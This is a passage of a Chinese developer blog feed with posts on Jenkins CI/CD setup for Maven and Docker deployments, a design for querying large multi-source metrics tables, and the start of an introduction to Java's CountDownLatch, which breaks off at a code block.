    <content type="html"><![CDATA[<h1 id="一、什么是-CI-x2F-CD"><a href="#一、什么是-CI-x2F-CD" class="headerlink" title="一、什么是 CI &#x2F; CD"></a>一、什么是 CI &#x2F; CD</h1><p>互联网软件的开发和发布，已经形成了一套标准流程，假如把开发工作流程分为以下几个阶段：</p><p><code>编码</code> → <code>构建</code> → <code>集成</code> → <code>测试</code> → <code>交付</code> → <code>部署</code></p><p> <img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/20190122160600.png" alt="img"> </p><p>如上图所示， <code>敏捷开发(Agile Development)</code>、<code>持续集成(Continuous Integration)</code>、<code>持续交付(Continuous Delivery)</code>和<code>持续部署(Continuous Deployment)</code>有着不同的软件自动化交付周期。 </p><h2 id="持续集成-CI"><a href="#持续集成-CI" class="headerlink" title="持续集成 CI"></a>持续集成 CI</h2><p><code> 持续集成</code> 指的是，频繁地（一天多次）将代码集成到主干。将软件个人研发的部分向软件整体部分交付，频繁进行集成以便更快地发现其中的错误。 </p><p>它的好处主要有：</p><ul><li>快速发现错误。每完成一点更新，就集成到主干，可以快速发现错误，定位错误也比较容易 ；</li><li>防止分支大幅偏离主干。如果不是经常集成，主干又在不断更新，会导致以后集成的难度变大，甚至难以集成。</li></ul><p>持续集成并不能消除Bug，而是让它们非常容易发现和改正。持续集成的目表是<strong>快速确保开发人员新提交的变更是好的，并且适合在代码库中进一步使用</strong>。它的核心措施是，<strong>代码集成到主干之前，必须通过编译和自动化测试流的验证</strong>。</p><h2 id="持续交付-CD"><a href="#持续交付-CD" class="headerlink" title="持续交付 CD"></a>持续交付 CD</h2><p><code>持续交付</code>（CD）实际上是 CI 的扩展，其中软件交付流程进一步自动化，以便随时轻松地部署到生成环境中。 成熟的持续交付方案也展示了一个始终可部署的代码库。使用 CD 后，软件发布将成为一个没有任何紧张感的例行事件。 开发团队可以在日常开发的任何时间进行产品级的发布，而不需要详细的发布方案或者特殊的后期测试。 </p><h2 id="持续部署-CD"><a href="#持续部署-CD" class="headerlink" title="持续部署 CD"></a>持续部署 CD</h2><p><code>持续部署</code> 扩展了持续交付，以便软件构建在通过所有测试时自动部署。在这样的流程中， 不需要人为决定何时及如何投入生产环境。CI&#x2F;CD 系统的最后一步将构建后的制品包通过流水线自动部署。 此类自动部署可以配置为快速向客户分发组件、功能模块或修复补丁，并准确说明当前提供的内容。采用持续部署的组织可以将新功能快速传递给用户，得到用户对于新版本的快速反馈，并且可以迅速处理任何明显的缺陷。 用户对无用或者误解需求的功能的快速反馈有助于团队规划投入，避免将精力集中于不容易产生回报的地方。 </p><blockquote><p>CI&#x2F;CD 扩展： <a href="https://blog.z0ukun.com/?p=2935">什么是 DevOps</a> </p></blockquote><h1 id="二、Jenkins"><a href="#二、Jenkins" class="headerlink" title="二、Jenkins"></a>二、Jenkins</h1><h2 id="1-Jenkins-概述"><a href="#1-Jenkins-概述" class="headerlink" title="1. Jenkins 概述"></a>1. Jenkins 概述</h2><blockquote><p>官方文档： <a href="https://jenkins.io/doc/">https://jenkins.io/doc/</a> </p></blockquote><p>Jenkins是一个开源的、可扩展的持续集成、交付、部署（软件&#x2F;代码的编译、打包、部署）的基于web界面的平台。允许<code>持续集成</code>和<code>持续交付</code>项目，无论用的是什么平台，可以处理任何类型的构建或持续集成。 </p><p>Jenkins 特性：</p><ul><li><p>开源的<code>java</code> 语言开发持续集成工具，支持<code>CI</code>，<code>CD</code>；</p></li><li><p>易于安装部署配置：可通过yum安装,或下载war包以及通过<strong>docker容器</strong>等快速实现安装部署，可方便web界面配置管理；</p></li><li><p>消息通知及测试报告：集成<code>RSS/E-mail</code>通过<code>RSS</code>发布构建结果或当构建完成时通过e-mail通知，生成<code>JUnit/TestNG</code>测试报告；</p></li><li><p>分布式构建：支持Jenkins能够让多台计算机一起构建&#x2F;测试；</p></li><li><p>文件识别：Jenkins能够跟踪哪次构建生成哪些jar，哪次构建使用哪个版本的jar等； </p></li><li><p>丰富的插件支持：支持扩展插件，你可以开发适合自己团队使用的工具，如<code>git</code>，<code>svn</code>，<code>maven</code>，<code>docker</code> 等。</p></li></ul><h2 id="2-Jenkins-安装"><a href="#2-Jenkins-安装" class="headerlink" title="2. Jenkins 安装"></a>2. Jenkins 安装</h2><p>参考 <a href="/2022/07/04/Jenkins%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%AE%9E%E7%8E%B0CI">Jenkins安装配置</a></p><h2 id="3-构建部署-Maven-项目"><a href="#3-构建部署-Maven-项目" class="headerlink" title="3. 构建部署 Maven 项目"></a>3. 构建部署 Maven 项目</h2><p> 主要分为<code>准备</code> 和 <code>构建部署</code>两个部分。</p><h3 id="3-1-配置准备"><a href="#3-1-配置准备" class="headerlink" title="3.1 配置准备"></a>3.1 配置准备</h3><ul><li>为了实现maven项目的构建需要先配置<code>gitlab</code>、<code>jdk</code>和<code>maven</code>，具体步骤如下：</li></ul><ol><li><code>系统管理 — 全局工具配置</code>，进入配置页面 ；</li><li>配置<code>jdk</code>，输入<code>jenkins</code> 所在机器的 <code>jdk</code> 的位置，即<code>JAVA_HOME</code> ；<br><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/20200728174815484.png" alt="在这里插入图片描述"></li><li>配置<code>maven</code>，自动安装一个maven；<br><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/20200728174925406.png" alt="在这里插入图片描述"></li><li>配置<code>gitlab</code>，参考 [Jenkins配置Gitlab]( <a href="https://www.cnblogs.com/gongxr/p/9257434.html">Jenkins中使用GitLab的配置 - 星瑞 - 博客园 (cnblogs.com)</a> ) 。</li></ol><ul><li>为了部署，需要配置远程的server：</li></ul><ol><li><p>首先，安装一个插件：Publish over SSH，<code>系统管理 — 插件管理 — 可选插件</code>，搜索安装即可；</p></li><li><p>然后，配置一个远程server，<code>系统管理 — 系统设置 - Publish over SSH</code></p><ul><li>首先使用以下命令生成一对公私钥（Jenkins不支持openssh高版本秘钥）；</li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen -m PEM -t rsa -b 4096<br></code></pre></td></tr></table></figure><ul><li>将公钥<code>id_rsa.pub</code> 的值拷贝到需要链接的目标server目录文件下：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim ~/.ssh/authorized_keys<br></code></pre></td></tr></table></figure></li></ul></li><li><p>可以将私钥<code>id_rsa</code>的路径填在<code>Path to key</code>里面，也可以把私钥文件里面的内容拷贝到<code>Key</code>里面；</p></li><li><p>最后，配置远程server，注意这里的<code>username</code> 需要为拷贝公钥时登录服务器的用户，点击<code>Test Configuration</code> ，左下角出现 <code>success</code> 字样（如下图），表示配置成功。</p></li></ol><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659427393101.png" alt="1659427393101"></p><h3 id="3-2-创建-Job-进行构建部署"><a href="#3-2-创建-Job-进行构建部署" class="headerlink" title="3.2 创建 Job 进行构建部署"></a>3.2 创建 Job 进行构建部署</h3><ol><li><code>新建任务-构建一个自由风格的软件项目</code>， 配置旧的构建的删除策略；</li></ol><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/20200728180101451.png" alt="在这里插入图片描述"> </p><ol start="2"><li>配置代码源，这里使用 <code>Git</code> 管理（若为 <code>gitlab</code> 项目，配置<code>gitlab</code>，参考 [Jenkins配置Gitlab]( <a href="https://www.cnblogs.com/gongxr/p/9257434.html">Jenkins中使用GitLab的配置 - 星瑞 - 博客园 (cnblogs.com)</a> ) ）；</li></ol><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/20200728181625451.png" alt="在这里插入图片描述"> </p><ol start="3"><li><code>Maven</code> 打包；</li></ol><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/20200728181250827.png" alt="在这里插入图片描述"> </p><ol start="4"><li>在server对应目录编写启动脚本<code>start.sh</code>：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">export</span> JAVA_HOME=/usr/local/java<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/local/java/bin<br><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$JAVA_HOME</span><br><br><span class="hljs-comment">#先将已经运行的本项目进程结束，避免重复运行造成端口冲突</span><br>pid=`ps -aux|grep SpringbootDemo-0.0.1-SNAPSHOT.jar | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`<br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$pid</span>&quot;</span> ]<br><span class="hljs-keyword">then</span><br>   <span class="hljs-built_in">kill</span> -9 <span class="hljs-variable">$pid</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">cd</span> /opt/jar<br><span class="hljs-comment">#运行启动本项目，BUILD_ID=dontKillMe命令避免后台运行jar包不生效</span><br>BUILD_ID=dontKillMe <span class="hljs-built_in">nohup</span> java -jar SpringbootDemo-0.0.1-SNAPSHOT.jar &gt;&gt; systemOut.<span class="hljs-built_in">log</span> 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><ol start="5"><li>将打好的<code>jar</code>包推到之前配置的server上面，配置如下：</li></ol><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659531972471.png" alt="1659531972471"></p><ul><li><code>Source files</code> ：以工作空间为根目录，填写工作空间中<code>target</code>下<code>jar</code> 包的位置</li></ul><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659532090821.png" alt="1659532090821"></p><ul><li><code>Remote directory</code> ：指定<code>jar</code> 上传的server目录</li><li><code>Exec command</code> ：构建后的需要执行的操作，这里需要启动jar包</li></ul><ol start="6"><li>回到任务面板，点击 <code>立即构建</code> 后，查看控制台输出：</li></ol><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659532320698.png" alt="1659532320698"></p><ol start="7"><li>控制台输出显示成功后，登录server查看jar包启动成功：</li></ol><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659532518067.png" alt="1659532518067"></p><p>至此，服务器部署完成！</p><h3 id="3-3-批量删除Jenkins历史构建记录"><a href="#3-3-批量删除Jenkins历史构建记录" class="headerlink" title="3.3 批量删除Jenkins历史构建记录"></a>3.3 批量删除Jenkins历史构建记录</h3><p><code>系统管理 — 脚本命令行</code>，输入以下命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">jobName</span> = <span class="hljs-string">&quot;一个 Maven 项目的构建部署&quot;</span>   //删除的项目名称<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">maxNumber</span> = <span class="hljs-number">32</span>    // 保留的最小编号，意味着小于该编号的构建都将被删除<br><br>Jenkins.instance.getItemByFullName(jobName).builds.findAll &#123;<br>  it.number &lt;= maxNumber<br>&#125;.each &#123;<br>  it.delete()<br>&#125;<br></code></pre></td></tr></table></figure><p>点击运行，即可看到被删除的构建记录：</p><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659533030820.png" alt="1659533030820"></p><h2 id="4-构建部署-docker-镜像"><a href="#4-构建部署-docker-镜像" class="headerlink" title="4. 构建部署 docker 镜像"></a>4. 构建部署 docker 镜像</h2><p>创建项目，配置<code>git</code>、<code>maven</code> 同前一节，区别在于任务配置中的<code>构建后操作</code>:</p><h3 id="4-1-编写并上传-Dockerfile"><a href="#4-1-编写并上传-Dockerfile" class="headerlink" title="4.1 编写并上传 Dockerfile"></a>4.1 编写并上传 Dockerfile</h3><p>构建镜像需要配置<code>Dockerfile</code> ，因此我们在项目根目录创建 <code>Dockerfile</code> ：</p><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659617197413.png" alt="1659617197413"></p><p><code>Dockerfile</code> 内容如下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># centos7 + jdk1.8 的基础镜像（java版本和项目用的保持一致即可）</span><br><span class="hljs-keyword">FROM</span> xxlaila/centos7.<span class="hljs-number">6</span>-jdk1.<span class="hljs-number">8</span>:latest<br><span class="hljs-keyword">MAINTAINER</span> dunkingcurry<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;/opt/docker/app&quot;</span></span><br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> SpringbootDemo-0.0.1-SNAPSHOT.jar /opt/docker/app/SpringbootDemo-0.0.1-SNAPSHOT.jar</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /opt/docker/app/appconfig</span><br><br><span class="hljs-comment">#对外暴露端口</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8089</span><br><br><span class="hljs-comment">#启动jar包</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> java -jar /opt/docker/app/SpringbootDemo-0.0.1-SNAPSHOT.jar</span><br></code></pre></td></tr></table></figure><p>将代码提交后，jenkins 任务执行后的工作空间根目录就会有我们编写 <code>Dockerfile</code> ；</p><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659617468659.png" alt="1659617468659"></p><p>接下来通过<code>构建后操作</code>首先将它上传到服务器的指定目录；</p><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659617542463.png" alt="1659617542463"></p><h3 id="4-2-上传-jar-包"><a href="#4-2-上传-jar-包" class="headerlink" title="4.2 上传 jar 包"></a>4.2 上传 jar 包</h3><p>然后上传 <code>jar</code>包至部署服务器的指定目录：</p><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659618011817.png" alt="1659618011817"></p><h3 id="4-3-构建镜像并启动容器"><a href="#4-3-构建镜像并启动容器" class="headerlink" title="4.3 构建镜像并启动容器"></a>4.3 构建镜像并启动容器</h3><p>参考 <code>4.2</code> 图中 <code>Exec command</code> 配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 停止正在运行的 springboot 容器</span><br>docker stop springboot<br><span class="hljs-comment"># 删除 springboot 容器</span><br>docker <span class="hljs-built_in">rm</span> springboot<br><span class="hljs-comment"># 删除 springboot 镜像</span><br>docker rmi springboot:v1 <br><span class="hljs-comment"># 构建新的镜像</span><br>docker build -t springboot:v1 .<br><span class="hljs-comment"># 启动容器，这里使用了centos镜像，需要加 -it 保持容器不退出</span><br>docker run -d -it -p 8089:8089 --name springboot springboot:v1<br></code></pre></td></tr></table></figure><p>保存配置后，回到任务面板，点击 <code>立即构建</code> 后，查看控制台输出成功后，查看容器状态，访问测试接口如下：</p><p><img src="/../blog-assets/Jenkins%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1659618377754.png" alt="1659618377754"></p><p>至此，收工！</p>]]></content>
    
    
    <categories>
      
      <category>DevOps</category>
      
      <category>基础知识</category>
      
      <category>Jenkins</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jenkins</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>效能指标数据报表查询</title>
    <link href="/2022/07/31/%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90%E5%A4%A7%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%80%9D%E8%B7%AF/"/>
    <url>/2022/07/31/%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90%E5%A4%A7%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="一、需求概述"><a href="#一、需求概述" class="headerlink" title="一、需求概述"></a>一、需求概述</h1><p>前台支持根据条件查询多项测试效能数据指标数据报表</p><h2 id="需求背景"><a href="#需求背景" class="headerlink" title="需求背景"></a>需求背景</h2><ul><li>需要查询的各项数据指标来自不同数据库的多张数据源表</li><li>数据源表存在大表（<code>1000w</code>-<code>2亿</code>数据量不等）</li><li>部分表日增量超过<code>100w</code>，且需要每日同步</li><li>前台查询响应时间不能太长</li></ul><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><p>工欲善其事，必先利其器。依据上述需求背景，设计方案如下：</p><ul><li><em>多数据源表同步至统一的数据仓库</em>：<ul><li>存量数据同步：因存量数据量大，将<code>datax</code> 环境打包成 <code>docker</code> 镜像，使用 <code>jenkins</code> 调度多台服务器执行多个容器实现多表并行同步，缩短数据同步时间</li><li>每日的增量数据同步：使用 <code>crontab</code> 配合 <code>datax</code> 实现</li></ul></li><li><em>中间表减少联表计算</em>：为避免指标查询过程中过多的连表操作，根据指标所需字段设计中间表（需考虑索引，这能极大程度提高查询效率），通过 <code>Java</code> <strong>定时任务提前对数据源表进行处理</strong>，做好部分计算和汇总至中间表中，操作时间在数据源表同步完成后</li><li><em>多线程加快查询</em>：<code>Java</code> 查询中间表，计算出各类指标数据，一般不存在依赖关系的指标可以<strong>多线程</strong>并发计算，最后汇总结果返回，将查询时间由<strong>多个查询的时间和</strong>优化为<strong>最长查询所需时间</strong></li></ul><p>现在我们有了初步方案，接下来就可以开始详细设计开发了。</p><h1 id="二、实战开发"><a href="#二、实战开发" class="headerlink" title="二、实战开发"></a>二、实战开发</h1><h2 id="1-多数据源表同步"><a href="#1-多数据源表同步" class="headerlink" title="1. 多数据源表同步"></a>1. 多数据源表同步</h2><p>在需求分析中我们已经了解到，本次所需要数据来自于多个不同数据库的数据源表。当然<code>oracle</code>  的 <code>dblink</code> 、<code>mysql</code> 的 <code>federated</code> 都可以帮我们实现在一个数据库实例中访问，但这种方式存在以下明显的缺陷：</p><ul><li>链接仅限同类数据库，即 <code>oracle</code> 只能连 <code>oracle</code> ，<code>mysql</code> 只能连 <code>mysql</code>，如果存在从 <code>oracle</code> 同步到 <code>mysql</code> 的情况就抓瞎了</li><li>链接依赖于网络，速度不稳定且比同库访问慢很多</li><li>应用自身无备份数据，无法自定义数据处理（例如指标数据通常需要看不同年份的环比数据，而数据源表的清理周期不一定与需求查询周期一致）</li><li>直接对数据源表进行查询，也增大了数据库服务器的压力</li></ul><p>因此基于以上缺点，同步数据库至统一的数据仓库显然是更好的选择：</p><ul><li><code>datax</code> 支持同步不同类型的数据库，即可以从 <code>oracle</code> 同步至 <code>mysql</code> </li><li><code>datax</code> 数据同步效率高，数据量同步速率可达<code>1w/s</code> </li><li>统一的数据仓库也更方便数据的管理，和自定义处理（例如可根据需要对同步的数据源表增加索引）</li><li>中间表的计算也基于同一数据库的表，效率更高</li></ul><p><code>datax</code> 同步多数据源表操作可参考该文章：<a href="/2022/07/29/%E9%AB%98%E6%95%88%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7DataX%E7%9A%84%E4%BD%BF%E7%94%A8">高效数据同步工具 DataX 的使用</a> </p><blockquote><p>【注】：由于表数据量大，必然涉及数据周期性清理，常规处理方式，数据保留周期2年，2年之前的数据移入历史表归档。</p></blockquote><h2 id="2-中间表减少联表计算"><a href="#2-中间表减少联表计算" class="headerlink" title="2. 中间表减少联表计算"></a>2. 中间表减少联表计算</h2><p>在数据源表同步至数据仓库后，一些指标涉及到多张表的复杂查询，这仍会大大降低查询效率，例如以下场景：</p><p>现需统计A应用在6月版本测试案例在6月的<code>自动化案例执行通过率</code>，指标计算公式如下：</p><blockquote><p>​     <strong>自动化案例执行通过率</strong> &#x3D; <strong>自动化执行通过的案例数</strong> &#x2F; <strong>当前版本案例总数</strong></p></blockquote><ul><li><strong>自动化案例执行通过</strong>：案例下关联的<strong>全部自动化脚本执行通过</strong></li><li><strong>自动化脚本执行通过</strong>：该脚本在6月内存在执行通过的记录，即多次调度有一次通过即算作通过</li></ul><p><img src="/../blog-assets/%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90%E5%A4%A7%E8%A1%A8%E6%9F%A5%E8%AF%A2%E6%80%9D%E8%B7%AF/1659012565648.png" alt="1659012565648"></p><p>以上计算逻辑图<strong>从右往左</strong>即为计算过程，该场景涉及到以下数据源表：</p><ul><li><strong>案例表</strong>：包含案例和应用的关联关系；</li><li><strong>案例与自动化脚本挂接关联表</strong>：包含案例和自动化脚本的关联关系；</li><li><strong>自动化脚本的执行明细表</strong>：包含脚本在指定时间内的执行记录。</li></ul><p>通过以上信息，我们可以知道<code>自动化脚本通过率</code>这个指标的查询：</p><ul><li>涉及到三张表的<strong>关联嵌套查询</strong>；</li><li>查询中包含着两个<strong>计算</strong>（案例是否通过，脚本是否执行通过）；</li><li>实际上脚本执行明细表数据量是非常大，实际单日增量在70w左右，存量数据上亿级别，即使有索引对该表的直接查询也很慢；</li></ul><p>因此，如果能提前将一些数据计算出来放入一张中间表，就能极大减少查询时间，在这个场景里，可以新建一张中间表包含以下字段：</p><table><thead><tr><th>script_id</th><th>month</th><th>is_pass</th></tr></thead><tbody><tr><td>脚本ID</td><td>按月维度计算</td><td>脚本是否执行通过标志</td></tr></tbody></table><p>该表记录了某个脚本在某个月份的执行通过信息，显然<code>is_allpass</code> 即为我们需要提前计算的值，而该值需要：</p><ul><li>因为每天都会有新增的脚本和调度记录，因此需要每日计算；</li><li>且计算需要在源表数据同步之后。</li></ul><p>综上，这里考虑将计算逻辑和将计算记录插入中间表操作，通过 <code>Springboot</code> 中定时任务注解 <code>@Schedule</code> 实现，实现方式较为简单可参考<a href="/2022/07/27/Java%E4%B8%AD%E7%9A%84%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0">Java 中的定时任务实现</a> 。</p><h2 id="3-多线程汇总查询"><a href="#3-多线程汇总查询" class="headerlink" title="3. 多线程汇总查询"></a>3. 多线程汇总查询</h2><p>经过前面两个步骤，我们通过数据同步，建立索引、中间表的方式一定程度上解决了查询速度慢，查询逻辑复杂的问题。但在实际实践操作中，查询效率仍旧不够理想，原因在于一次往往是查询多个需要复杂计算逻辑的指标，虽然我们优化了单个指标的查询，但如果采用传统串行执行查询的方式，单次查询的效率为<strong>多次查询时间之和</strong>，这显然是不科学的。因此我们引入java中的多线程处理：</p><ul><li>有<code>n</code> 个指标需要同时查询，就使用线程池创建包含<code>n</code> 个线程的线程池；</li><li>利用 <code>CountDownLatch</code> 来汇总多个线程执行结果，统一返回至前端。</li></ul><p>以上操作具体实现可参考 <a href="/2022/07/06/%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8(%E4%B8%80)">线程池创建</a> 和 <a href="/2022/07/30/CountDownLatch%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%90%8C%E4%B8%80%E4%BB%BB%E5%8A%A1">CountDownLatch多线程执行同一任务</a> ，至此我们将查询时间由<strong>多个查询的时间和</strong>优化为<strong>最长查询所需时间</strong>，查询效率优化到这也暂告一段落。</p><h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>本文用来记录一次指标查询需求的分析、设计、实现过程，由于能力和经验不足，方案必然还存在极大的优化空间。整个过程下来：</p><ol><li>感受最深的还是数据库表结构的设计，大表字段、索引、分区的设计对数据操作的效率、数据操作的逻辑都存在巨大的影响，良好的表结构设计不仅能提高查询效率，也能简化查询逻辑，让整个处理链条更为清晰，方便维护；</li><li>本次没有涉及到分库分表，但我们知道当表数据超过千万量级对数据库的性能已经会产生较大影响了，具体可参考  <a href="https://blog.csdn.net/m0_48383346/article/details/116999608?ops_request_misc=%7B%22request_id%22:%22165925327116781432942421%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165925327116781432942421&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116999608-null-null.142%5Ev35%5Eexperiment_2_v1&utm_term=%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8&spm=1018.2226.3001.4187">分库分表原因</a> ，这也是后续优化改进的方向；</li><li>该方案中使用了数据源表和中间表，借此机会初步了解了下 <code>数据仓库（data warehouse）</code> ，数仓的架构体系应该是该类业务决策性需求的标准答案，后续应该着重学习这块的内容。</li></ol><p><strong>道阻且长，行则将至</strong>。</p>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
      <category>实战系列</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>java</tag>
      
      <tag>mysql</tag>
      
      <tag>oracle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CountDownLatch 多线程执行同一任务</title>
    <link href="/2022/07/30/CountDownLatch%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%90%8C%E4%B8%80%E4%BB%BB%E5%8A%A1/"/>
    <url>/2022/07/30/CountDownLatch%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%90%8C%E4%B8%80%E4%BB%BB%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="一、什么是-CountDownlatch"><a href="#一、什么是-CountDownlatch" class="headerlink" title="一、什么是 CountDownlatch"></a>一、什么是 CountDownlatch</h1><p> <code>CountDownLatch</code> 是一个同步工具类，它通过一个计数器来实现的,初始值为线程的数量。每当一个线程完成了自己的任务,计数器的值就相应得减1。当计数器到达0时,表示所有的线程都已执行完毕,然后在等待的线程就可以恢复执行任务 </p><h1 id="二、常用方法详解"><a href="#二、常用方法详解" class="headerlink" title="二、常用方法详解"></a>二、常用方法详解</h1><ul><li><code>CountDownLatch(int count)</code>：<code>count</code>为计数器的初始值（一般需要多少个线程执行，<code>count</code> 就设置为几）；</li><li><code>countDown()</code>: 每调用一次计数器值 - 1，直到<code>count</code>被减为 0，代表所有线程全部执行完毕；</li><li><code>getCount()</code>：获取当前计数器的值；</li><li><code>await()</code>: 等待计数器变为0，即等待所有异步线程执行完毕；</li><li><code>boolean await(long timeout, TimeUnit unit)</code>： 此方法与<code>await()</code>区别：<ol><li>此方法至多会等待指定的时间，超时后会自动唤醒，若 timeout 小于等于零，则不会等待；</li><li>boolean 类型返回值：若指定的等待时间内计数器变为零了，则返回 true；若指定的等待时间过去了，则返回 false。</li></ol></li></ul><h1 id="三、CountDownLatch-应用场景"><a href="#三、CountDownLatch-应用场景" class="headerlink" title="三、CountDownLatch 应用场景"></a>三、CountDownLatch 应用场景</h1><ul><li>某个线程需要<strong>在其他n个线程执行完毕后再向下执行</strong></li></ul><ol start="2"><li><strong>多个线程并行执行同一个任务</strong>，提高响应速度</li></ol><p>以下为一个多线程并行处理数据后汇总的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 